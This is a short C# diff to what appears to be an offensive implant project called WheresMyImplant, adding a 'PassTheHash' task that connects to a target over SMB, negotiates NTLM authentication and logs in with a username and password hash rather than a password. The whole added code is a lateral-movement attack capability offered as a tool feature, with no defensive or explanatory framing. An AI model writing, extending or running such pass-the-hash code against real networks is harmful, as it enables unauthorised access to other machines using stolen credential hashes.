@@ -608,5 +608,21 @@ namespace WheresMyImplant
             output.Append(wp.GetOutput());
             return output.ToString();
         }
+
+        [ManagementTask]
+        public static String PassTheHash(String target, String domain, String username, String hash)
+        {
+            String output;
+            using (SMBClient smbClient = new SMBClient())
+            {
+                smbClient.Connect(target);
+                smbClient.NegotiateSMB();
+                smbClient.NegotiateSMB2();
+                smbClient.NTLMSSPNegotiate();
+                smbClient.Authenticate(domain, username, hash);
+                output = smbClient.GetOutput();
+            }
+            return output;
+        }
     }
 }
